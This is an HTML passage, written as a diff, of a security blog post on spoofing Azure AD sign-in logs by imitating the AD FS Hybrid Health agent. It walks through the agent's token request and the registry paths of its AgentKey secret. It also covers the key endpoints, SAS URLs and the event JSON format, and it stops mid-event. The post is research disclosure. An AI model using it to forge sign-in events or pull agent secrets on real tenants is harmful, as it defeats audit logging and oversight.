@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="en-gb">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="cache-control" content="no-cache"> 
+<meta http-equiv="expires" content="0"> 
+<meta http-equiv="pragma" content="no-cache">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spoofing Azure AD sign-ins logs by imitating AD FS Hybrid Health Agent</title>
+<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
+<meta name="generator" content="Hugo 0.39" />
+<meta property="og:title" content="Spoofing Azure AD sign-ins logs by imitating AD FS Hybrid Health Agent" />
+<meta property="og:description" content="Azure AD Connect Health is a feature that allows viewing the health of on-prem hybrid infrastructure components, including Azure AD Connect and AD FS servers.
+Health information is gathered by agents installed on each on-prem hybrid server. Since March 2021, also AD FS sign-in events are gathered and sent to Azure AD.
+
+In this write-up (based on a Threat Analysis report by Secureworks), I&rsquo;ll explain how anyone with a local administrator access to AD FS server (or proxy), can create arbitrary sign-ins events to Azure AD sign-ins log.
+Moreover, I&rsquo;ll show how Global Administrators can register fake agents to Azure AD - even for tenants not using AD FS at all.
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://o365blog.com/post/hybridhealthagent/" />
+
+
+
+<meta property="article:published_time" content="2021-07-08T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2021-09-08T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="dns-prefetch" href="//fonts.googleapis.com" />
+<link rel="dns-prefetch" href="//fonts.gstatic.com" />
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
+<script type="text/javascript" src="/js/scripts.js"></script>
+<script type="text/javascript" src="/js/tools.js"></script>
+
+<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
+<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
+<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
+<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
+<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
+<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
+<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
+<meta name="application-name" content="&nbsp;"/>
+<meta name="msapplication-TileColor" content="#FFFFFF" />
+<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
+<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
+<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
+<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
+<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-61454000-4', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+</head>
+<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
+	<div class="container container-outer">
+		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
+		
+			<div class="container container-inner clearfix">
+			
+				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
+				
+					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
+						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
+						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
+					</a>
+				</div>
+			</div>
+			
+<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<ul class="menu__list">
+		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
+		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
+		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
+	</ul>
+</nav>
+
+		</header>
+		<div class="wrapper clearfix">
+
+<main class="main-content content" role="main" itemprop="mainContentOfPage">
+	<article class="post">
+		<header class="post__header clearfix">
+			<h1 class="post__title">Spoofing Azure AD sign-ins logs by imitating AD FS Hybrid Health Agent</h1>
+			<p class="post__meta meta">
+				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
+				<time class="post__meta-date" datetime="2021-07-08T00:00:00">July 08, 2021</time>
+					<time class="post__meta-lastmod" datetime="2021-09-08T00:00:00"> (Last Modified: September 08, 2021)</time>
+				<span class="post__meta-categories meta-categories">
+					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
+					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
+			</p>
+			<div class="post__tags tags clearfix">
+<ul class="tags__list">
+	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fhybridhealthagent%2f&text=Spoofing%20Azure%20AD%20sign-ins%20logs%20by%20imitating%20AD%20FS%20Hybrid%20Health%20Agent&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fhybridhealthagent%2f&mini=true&title=Spoofing%20Azure%20AD%20sign-ins%20logs%20by%20imitating%20AD%20FS%20Hybrid%20Health%20Agent&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+</ul>
+</div>
+		</header>
+		<div class="post__content clearfix">
+			<figure class="post__thumbnail">
+				<img src="/images/posts/hhealth.png" alt="Spoofing Azure AD sign-ins logs by imitating AD FS Hybrid Health Agent">
+			</figure>
+				<nav id="TableOfContents">
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#hybrid-health-agent-for-ad-fs">Hybrid Health agent for AD FS</a></li>
+<li><a href="#process-and-protocol-details">Process and protocol details</a>
+<ul>
+<li><a href="#step-1-log-in">Step 1: Log in</a></li>
+<li><a href="#step-2-write-event-id-1200">Step 2: Write Event Id 1200</a></li>
+<li><a href="#step-3-read-events">Step 3: Read Events</a></li>
+<li><a href="#step-4-get-service-access-token">Step 4: Get Service Access Token</a></li>
+<li><a href="#step-5-get-blob-upload-key">Step 5: Get Blob Upload Key</a></li>
+<li><a href="#step-6-get-event-publisher-key">Step 6: Get Event Publisher Key</a></li>
+<li><a href="#step-7-upload-events-to-blob-storage">Step 7: Upload Events to blob storage</a></li>
+<li><a href="#step-8-send-signature-to-events-hub">Step 8: Send signature to events hub</a></li>
+</ul></li>
+<li><a href="#spoofing-sign-ins-log-with-aadinternals">Spoofing sign-ins log with AADInternals</a></li>
+<li><a href="#tampering-with-sign-ins-log">Tampering with sign-ins log</a></li>
+<li><a href="#registering-fake-agents-with-aadinternals-v0-5-0-and-later">Registering fake agents with AADInternals v0.5.0 and later</a>
+<ul>
+<li><a href="#registering-hybrid-health-service">Registering hybrid health service</a></li>
+<li><a href="#registering-ad-fs-server">Registering AD FS server</a></li>
+<li><a href="#creating-fake-events">Creating fake events</a></li>
+<li><a href="#removing-fake-services-and-agents">Removing fake services and agents</a></li>
+</ul></li>
+<li><a href="#how-to-detect">How to detect</a>
+<ul>
+<li><a href="#exporting-agent-secrets">Exporting agent secrets</a></li>
+<li><a href="#spoofing">Spoofing</a></li>
+<li><a href="#registering-fake-services">Registering fake services</a></li>
+</ul></li>
+<li><a href="#how-to-prevent">How to prevent</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+</nav>
+			<p><strong>Azure AD Connect Health</strong> is a feature that allows viewing the health of on-prem hybrid infrastructure components, including Azure AD Connect and AD FS servers.
+Health information is gathered by agents installed on each on-prem hybrid server. Since March 2021, also AD FS sign-in events are gathered and sent to Azure AD.</p>
+
+<p>In this write-up (based on a Threat Analysis <a href="https://www.secureworks.com/research/azure-active-directory-sign-ins-log-tampering" target="_blank">report</a> by Secureworks), I&rsquo;ll explain how anyone with a local administrator access to AD FS server (or proxy), can create arbitrary sign-ins events to Azure AD sign-ins log.
+Moreover, I&rsquo;ll show how Global Administrators can register fake agents to Azure AD - even for tenants not using AD FS at all.</p>
+
+<p></p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Per <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect#what-is-azure-ad-connect-health" target="_blank"> Azure AD Connect Health</a> documentation:</p>
+
+<blockquote>
+<p>Azure Active Directory (Azure AD) Connect Health provides robust monitoring of your on-premises identity infrastructure. It enables you to maintain a reliable connection to Microsoft 365 and Microsoft Online Services. This reliability is achieved by providing monitoring capabilities for your key identity components. Also, it makes the key data points about these components easily accessible.</p>
+</blockquote>
+
+<p>After configuration and installation, we can see the health of AD FS services in the Azure AD Portal:</p>
+
+<p><img src="/images/posts/hhealth_01.png" alt="AD FS health" /></p>
+
+<p>We can also drill-down to see details:</p>
+
+<p><img src="/images/posts/hhealth_02.png" alt="AD FS health" /></p>
+
+<p>The logical structure of the hybrid health AD FS services in ArchiMate notation can be seen below:</p>
+
+<p><img src="/images/posts/hhealth_11.png" alt="AD FS health structure" /></p>
+
+<p>The <strong>service</strong> represents the AD FS service and has the name equal to the hostname property of <strong>AD FS service</strong>:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the AD FS service name</span>
+<span class="nb">Get-AdfsProperties</span> <span class="p">|</span> <span class="n">Select</span> <span class="n">Hostname</span></code></pre></div>
+
+<pre><code>HostName            
+--------            
+sts.fake.myo365.site
+</code></pre>
+
+<p>The <strong>service</strong> consists of <strong>service member</strong>s, which can be either <strong>federation server</strong> or <strong>federation server proxy</strong>. Service members names are equal equal to the hostname of the <strong>server</strong> or the <strong>proxy</strong>:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the computer host name</span>
+<span class="nv">$env:COMPUTERNAME</span></code></pre></div>
+
+<pre><code>SERVER
+</code></pre>
+
+<p>To get things going, an agent need to be installed on each AD FS and proxy server. License requirements to use Azure AD Connect Health is <strong>Azure AD Premium P1</strong> or <strong>P2</strong>.</p>
+
+<h1 id="hybrid-health-agent-for-ad-fs">Hybrid Health agent for AD FS</h1>
+
+<p>The Health Agent for AD FS has been there for years to report the health of the service. In March 2021, Microsoft <a href="https://techcommunity.microsoft.com/t5/azure-active-directory-identity/march-identity-updates-public-preview-of-ad-fs-sign-in-activity/ba-p/1994705" target="_blank">announced</a>
+that a public preview for <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-health-ad-fs-sign-in" target="_blank">AD FS sign-ins in Azure AD reporting</a> is available to all customers.</p>
+
+<p>As soon as this was announced, I took a brief look and noticed that the agent is using Azure service bus (same than PTA authentication and Azure Web Application Proxy). Finally, at the end of May, I had time for
+proper research.</p>
+
+<p>Technically, in Azure AD, there are individual logs for a different types of sign-ins:</p>
+
+<ul>
+<li>SignInLogs</li>
+<li>NonInteractiveUserSignInLogs</li>
+<li>ServicePrincipalSignInLogs</li>
+<li>ManagedIdentitySignInLogs</li>
+<li>ProvisioningLogs</li>
+<li>ADFSSignInLogs</li>
+<li>RiskyUsers</li>
+<li>UserRiskEvents</li>
+</ul>
+
+<p>The &ldquo;normal&rdquo; Azure AD sign-ins events are stored to a log called <strong>SignInLogs</strong> and AD FS sign-ins to a log called <strong>ADFSSignInLogs</strong>:</p>
+
+<p><img src="/images/posts/hhealth_03.png" alt="sign-ins logs: source Secureworks" /></p>
+
+<p>If the organisation has an Azure subscription, ADFSSignInLogs can be exported to Log Analytics workspace to be viewed and analysed. Below is an example of events extracted from Log Analytics:</p>
+
+<p><img src="/images/posts/hhealth_05.png" alt="ADFSSignInLogs: source Secureworks" /></p>
+
+<p>Administrators can view sign-ins logs in Azure Admin Portal. However, there is no dedicated tab for ADFSSignInLogs. Instead, AD FS log-in events are shown in <strong>User sign-ins (interactive)</strong> alongside &ldquo;normal&rdquo; Azure AD sign-ins events.</p>
+
+<p>Below is an example where we can see AD FS log-in events from above in Azure AD sign-ins log:</p>
+
+<p><img src="/images/posts/hhealth_06.png" alt="AD FS Security Event: source Secureworks" /></p>
+
+<p>The Health Agent for AD FS consists of three services. The one that is responsible for sending the events to Azure AD is <strong>Azure AD Connect Health AD FS Insights Service</strong>:</p>
+
+<p><img src="/images/posts/hhealth_07.png" alt="AD FS Health Agent services: source Secureworks" /></p>
+
+<h1 id="process-and-protocol-details">Process and protocol details</h1>
+
+<p>The overall process how AD FS sign-ins events are gathered and sent to Azure AD is illustrated below:</p>
+
+<p><img src="/images/posts/hhealth_08.png" alt="AD FS Security Event: source Secureworks" /></p>
+
+<h2 id="step-1-log-in">Step 1: Log in</h2>
+
+<p>First, a user logs in to AD FS using any method configured and available for the user.</p>
+
+<h2 id="step-2-write-event-id-1200">Step 2: Write Event Id 1200</h2>
+
+<p>During and after a successful or failed log-in, AD FS server writes multiple auditing events to <strong>Security</strong> log. Auditing is turned on during the installation of the agent and is a prerequisite for gathering events.</p>
+
+<p>The <strong>Event Id 1200</strong> contains details about the log-in event:</p>
+
+<p><img src="/images/posts/hhealth_04.png" alt="AD FS Security Event: source Secureworks" /></p>
+
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-16&#34;?&gt;</span>
+<span class="nt">&lt;AuditBase</span> <span class="na">xmlns:xsd=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xsi:type=</span><span class="s">&#34;AppTokenAudit&#34;</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;AuditType&gt;</span>AppToken<span class="nt">&lt;/AuditType&gt;</span>
+  <span class="nt">&lt;AuditResult&gt;</span>Success<span class="nt">&lt;/AuditResult&gt;</span>
+  <span class="nt">&lt;FailureType&gt;</span>None<span class="nt">&lt;/FailureType&gt;</span>
+  <span class="nt">&lt;ErrorCode&gt;</span>N/A<span class="nt">&lt;/ErrorCode&gt;</span>
+  <span class="nt">&lt;ContextComponents&gt;</span>
+    <span class="nt">&lt;Component</span> <span class="na">xsi:type=</span><span class="s">&#34;ResourceAuditComponent&#34;</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;RelyingParty&gt;</span>urn:federation:MicrosoftOnline<span class="nt">&lt;/RelyingParty&gt;</span>
+      <span class="nt">&lt;ClaimsProvider&gt;</span>AD AUTHORITY<span class="nt">&lt;/ClaimsProvider&gt;</span>
+      <span class="nt">&lt;UserId&gt;</span>AADINTERNALS\test<span class="nt">&lt;/UserId&gt;</span>
+    <span class="nt">&lt;/Component&gt;</span>
+    <span class="nt">&lt;Component</span> <span class="na">xsi:type=</span><span class="s">&#34;AuthNAuditComponent&#34;</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;PrimaryAuth&gt;</span>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport<span class="nt">&lt;/PrimaryAuth&gt;</span>
+      <span class="nt">&lt;DeviceAuth&gt;</span>false<span class="nt">&lt;/DeviceAuth&gt;</span>
+      <span class="nt">&lt;DeviceId&gt;</span>N/A<span class="nt">&lt;/DeviceId&gt;</span>
+      <span class="nt">&lt;MfaPerformed&gt;</span>false<span class="nt">&lt;/MfaPerformed&gt;</span>
+      <span class="nt">&lt;MfaMethod&gt;</span>N/A<span class="nt">&lt;/MfaMethod&gt;</span>
+      <span class="nt">&lt;TokenBindingProvidedId&gt;</span>false<span class="nt">&lt;/TokenBindingProvidedId&gt;</span>
+      <span class="nt">&lt;TokenBindingReferredId&gt;</span>false<span class="nt">&lt;/TokenBindingReferredId&gt;</span>
+      <span class="nt">&lt;SsoBindingValidationLevel&gt;</span>TokenUnbound<span class="nt">&lt;/SsoBindingValidationLevel&gt;</span>
+    <span class="nt">&lt;/Component&gt;</span>
+    <span class="nt">&lt;Component</span> <span class="na">xsi:type=</span><span class="s">&#34;ProtocolAuditComponent&#34;</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;OAuthClientId&gt;</span>N/A<span class="nt">&lt;/OAuthClientId&gt;</span>
+      <span class="nt">&lt;OAuthGrant&gt;</span>N/A<span class="nt">&lt;/OAuthGrant&gt;</span>
+    <span class="nt">&lt;/Component&gt;</span>
+    <span class="nt">&lt;Component</span> <span class="na">xsi:type=</span><span class="s">&#34;RequestAuditComponent&#34;</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;Server&gt;</span>http://sts.fake.myo365.site/adfs/services/trust<span class="nt">&lt;/Server&gt;</span>
+      <span class="nt">&lt;AuthProtocol&gt;</span>WSFederation<span class="nt">&lt;/AuthProtocol&gt;</span>
+      <span class="nt">&lt;NetworkLocation&gt;</span>Intranet<span class="nt">&lt;/NetworkLocation&gt;</span>
+      <span class="nt">&lt;IpAddress&gt;</span>10.10.10.30<span class="nt">&lt;/IpAddress&gt;</span>
+      <span class="nt">&lt;ForwardedIpAddress</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;ProxyIpAddress&gt;</span>N/A<span class="nt">&lt;/ProxyIpAddress&gt;</span>
+      <span class="nt">&lt;NetworkIpAddress&gt;</span>N/A<span class="nt">&lt;/NetworkIpAddress&gt;</span>
+      <span class="nt">&lt;ProxyServer&gt;</span>N/A<span class="nt">&lt;/ProxyServer&gt;</span>
+      <span class="nt">&lt;UserAgentString&gt;</span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36<span class="nt">&lt;/UserAgentString&gt;</span>
+      <span class="nt">&lt;Endpoint&gt;</span>/adfs/ls/<span class="nt">&lt;/Endpoint&gt;</span>
+    <span class="nt">&lt;/Component&gt;</span>
+  <span class="nt">&lt;/ContextComponents&gt;</span>
+<span class="nt">&lt;/AuditBase&gt;</span></code></pre></div>
+
+<h2 id="step-3-read-events">Step 3: Read Events</h2>
+
+<p>The agent reads (at least) all Id 1200 events. The agent seems to be monitoring the <strong>Security log</strong> for changes.</p>
+
+<h2 id="step-4-get-service-access-token">Step 4: Get Service Access Token</h2>
+
+<p>The agent gets a <strong>Service Access Token</strong> from Azure AD. The token is fetched by making HTTP POST request to:</p>
+
+<pre><code>https://s1.adhybridhealth.azure.com/oauth2/token
+</code></pre>
+
+<p>The body of the request is (line changes added):</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml">grant_type=client_credentials<span class="err">&amp;</span>client_secret=<span class="nt">&lt;client_secret&gt;</span><span class="err">&amp;</span>client_id=<span class="nt">&lt;tenant_id&gt;</span>_<span class="nt">&lt;machine_id&gt;</span></code></pre></div>
+
+<p><strong>&lt;client_secret&gt;</strong> is a so called AgentKey, which is stored to the registry of AD FS server. The AgentKey is &ldquo;protected&rdquo; with DPAPI.
+<strong>&lt;client_id&gt;</strong> is a combination of the tenant id and machine id. Both of the values are also stored to the registry.</p>
+
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Registry location</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>client_secret</td>
+<td>HKLM:\SOFTWARE\Microsoft\ADHealthAgent\AgentKey</td>
+</tr>
+
+<tr>
+<td>tenant_id</td>
+<td>HKLM:\SOFTWARE\Microsoft\ADHealthAgent\TenantId</td>
+</tr>
+
+<tr>
+<td>machine_id</td>
+<td>HKLM:\SOFTWARE\Microsoft\Microsoft Online\Reporting\MonitoringAgent\MachineIdentity</td>
+</tr>
+</tbody>
+</table>
+
+<p>As a response, we will have a JSON file containing the service access token:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+	<span class="nt">&#34;access_token&#34;</span><span class="p">:</span> <span class="s2">&#34;2Fx1s5Th9h4...D4efhRG4&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;token_type&#34;</span><span class="p">:</span> <span class="s2">&#34;bearer&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;expires_in&#34;</span><span class="p">:</span> <span class="mi">3599</span>
+<span class="p">}</span></code></pre></div>
+
+<p>The service access token is NOT a standard JWT token, but some Microsot encrypted blob. The token is valid for (almost) an hour.</p>
+
+<h2 id="step-5-get-blob-upload-key">Step 5: Get Blob Upload Key</h2>
+
+<p>The agent gets a <strong>Blob Upload Key</strong> that is required to send the actual events to Azure AD. The key is fetched by making HTTP GET request to:
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml">https://s1.adhybridhealth.azure.com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/<span class="nt">&lt;service_id&gt;</span>/keys/BlobUploadKey</code></pre></div></p>
+
+<p><strong>&lt;service_id&gt;</strong> refers to the id of <strong>AD FS service</strong> registered to Azure AD during the first agent installation. The id not shown in the Azure Portal, but is luckily also stored to the registry.</p>
+
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Registry location</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>service_id</td>
+<td>HKLM:\SOFTWARE\Microsoft\ADHealthAgent\ADFS\ServiceId</td>
+</tr>
+</tbody>
+</table>
+
+<p>The <strong>Service Access Token</strong> from the previous step is included in the Authorization header:</p>
+
+<pre><code>Authorization: Bearer &lt;service access token&gt;
+</code></pre>
+
+<p>As a response, we will get a URL for the blob storage with a working shared access signature (SAS) token. The <strong>&lt;service_id&gt;</strong> is the service id sent in the request.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml">https://adhsprodweuaadsynciadata.blob.core.windows.net/adfederationservice-<span class="nt">&lt;service_id&gt;</span>?sv=2018-03-28<span class="err">&amp;</span>sr=c<span class="err">&amp;</span>sig=RCrQOWOLr%2FjHIX6%2FxCti1bPmbHgkp4T9eLS07uP%2FyKM%3D<span class="err">&amp;</span>se=2021-07-10T08%3A01%3A46Z<span class="err">&amp;</span>sp=w</code></pre></div>
+
+<h2 id="step-6-get-event-publisher-key">Step 6: Get Event Publisher Key</h2>
+
+<p>The agent gets an <strong>Event Publisher Key</strong> that is required to send the signature of the events blob to Azure AD. The key is fetched by making HTTP GET request to:
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml">https://s1.adhybridhealth.azure.com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/<span class="nt">&lt;service_id&gt;</span>/keys/EventHubPublisherKey</code></pre></div></p>
+
+<p><strong>&lt;service_id&gt;</strong> is the same as in the previous step, and the service access token is also used similarly for authentication.</p>
+
+<p>As a response, we will get a JSON file that is just a single string containing Azure Service Bus endpoint and other related information, including another SAS token.
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="s2">&#34;Endpoint=sb://adhsprodweuehadfsia.servicebus.windows.net/;SharedAccessSignature=SharedAccessSignature sr=sb%3a%2f%2fadhsprodweuehadfsia.servicebus.windows.net%2fadhsprodweuehadfsia%2fPublishers%2f658fe106-a59d-404e-985b-0c1bf3b4f72d&amp;sig=4%2bZ%2bNurnA4%2b4t6dvTG8kqraJMlNzxKF0KFjiBIaZUw4%3d&amp;se=1625904056&amp;skn=RootManageSharedAccessKey;EntityPath=adhsprodweuehadfsia;Publisher=658fe106-a59d-404e-985b-0c1bf3b4f72d&#34;</span></code></pre></div></p>
+
+<h2 id="step-7-upload-events-to-blob-storage">Step 7: Upload Events to blob storage</h2>
+
+<p>The events are sent to blob storage as a json file, which consists of an array of event objects. Below is the json file for the event from the step 2:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="ln"> 1</span><span class="p">[</span>
+<span class="ln"> 2</span>	<span class="p">{</span>
+<span class="ln"> 3</span>		<span class="nt">&#34;UniqueID&#34;</span><span class="p">:</span> <span class="s2">&#34;434c2d29-a4a0-4ce2-86f5-1679bbadc948&#34;</span><span class="p">,</span>
+<span class="ln"> 4</span>		<span class="nt">&#34;Server&#34;</span><span class="p">:</span> <span class="s2">&#34;SERVER&#34;</span><span class="p">,</span>
+<span class="ln"> 5</span>		<span class="nt">&#34;EventType&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+<span class="ln"> 6</span>		<span class="nt">&#34;PrimaryAuthentication&#34;</span><span class="p">:</span> <span class="mi">33</span><span class="p">,</span>
+<span class="ln"> 7</span>		<span class="nt">&#34;RequiredAuthType&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+<span class="ln"> 8</span>		<span class="nt">&#34;RelyingParty&#34;</span><span class="p">:</span> <span class="s2">&#34;urn:federation:MicrosoftOnline&#34;</span><span class="p">,</span>
+<span class="ln"> 9</span>		<span class="nt">&#34;RelyingPartyName&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+<span class="ln">10</span>		<span class="nt">&#34;Result&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+<span class="ln">11</span>		<span class="nt">&#34;DeviceAuthentication&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+<span class="ln">12</span>		<span class="nt">&#34;URL&#34;</span><span class="p">:</span> <span class="s2">&#34;/adfs/ls&#34;</span><span class="p">,</span>
+<span class="ln">13</span>		<span class="nt">&#34;User&#34;</span><span class="p">:</span> <span class="mi">1350057402</span><span class="p">,</span>
+<span class="hl"><span class="ln">14</span>		<span class="nt">&#34;UserId&#34;</span><span class="p">:</span> <span class="s2">&#34;AADINTERNALS\\test&#34;</span><span class="p">,</span>
+</span><span class="ln">15</span>		<span class="nt">&#34;UserIdType&#34;</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
+<span class="hl"><span class="ln">16</span>		<span class="nt">&#34;UPN&#34;</span><span class="p">:</span> <span class="s2">&#34;test@fabrikam.azurelabs.online&#34;</span><span class="p">,</span>
+</span><span class="ln">17</span>		<span class="nt">&#34;Timestamp&#34;</span><span class="p">:</span> <span class="s2">&#34;2021-07-09T07:03:54.9506592Z&#34;</span><span class="p">,</span>
+<span class="ln">18</span>		<span class="nt">&#34;Protocol&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
+<span class="ln">19</span>		<span class="nt">&#34;NetworkLocation&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+<span class="ln">20</span>		<span class="nt">&#34;AppTokenFailureType&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+<span class="ln">21</span>		<span class="nt">&#34;IPAddress&#34;</span><span class="p">:</span> <span class="s2">&#34;10.10.10.30&#34;</span><span class="p">,</span>
+<span class="ln">22</span>		<span class="nt">&#34;ClaimsProvider&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+<span class="ln">23</span>		<span class="nt">&#34;OAuthClientID&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+<span class="ln">24</span>		<span class="nt">&#34;OAuthTokenRetrievalMethod&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+<span class="ln">25</span>		<span class="nt">&#34;MFA&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+<span class="ln">26</span>		<span class="nt">&#34;MFAProviderErrorCode&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+<span class="ln">27</span>		<span class="nt">&#34;ProxyServer&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+<span class="ln">28</span>		<span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;/adfs/ls/&#34;</span><span class="p">,</span>
+<span class="ln">29</span>		<span class="nt">&#34;UserAgent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#34;</span><span class="p">,</span>
